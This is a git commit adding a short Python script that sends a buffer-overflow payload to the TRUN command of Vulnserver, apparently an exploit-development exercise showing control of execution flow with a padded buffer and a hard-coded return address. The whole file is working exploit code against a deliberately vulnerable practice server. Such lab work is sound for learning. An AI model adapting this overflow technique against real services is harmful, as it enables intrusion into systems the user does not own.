a76d66964a2ed2ed27b6c31025e30322db29bfdb
Hrishi Ghosalkar <87890571+rookie-cookie-8@users.noreply.github.com>
2024-02-13 11:51:58 +0530

    Create executiuon-flow.py

---
+++ executiuon-flow.py
@@ -0,0 +1,27 @@
+#!/usr/bin/python3
+
+import sys,socket
+from time import sleep
+
+print("**************VULNSERVER- TRUN *************")
+sleep(0.5)
+ip_address=input("ENter the IP address\n")
+port_number=input("Enter the port number\n")
+
+if (len(ip_address)<=0) or (len(port_number)<=0):
+    if (len(ip_address)>0) and (len(port_number)<=0):
+        print("*" * 30)
+        print("Port number field is empty")
+    elif (len(ip_address)<=0) and (len(port_number)>0):
+        print("*" * 30)
+        print("IP address field is empty")
+    else:
+        print("*" * 30)
+        print("Issues with the user input")
+
+elif (len(ip_address)>0) and (len(port_number)>0):
+    buffer=b"A" * 2003 + b"\xAF\x11\x50\x62" + b"C" *(2400-2003-4)
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((ip_address, int(port_number)))
+    s.send((b"TRUN /.:/" + buffer))
+    s.close()
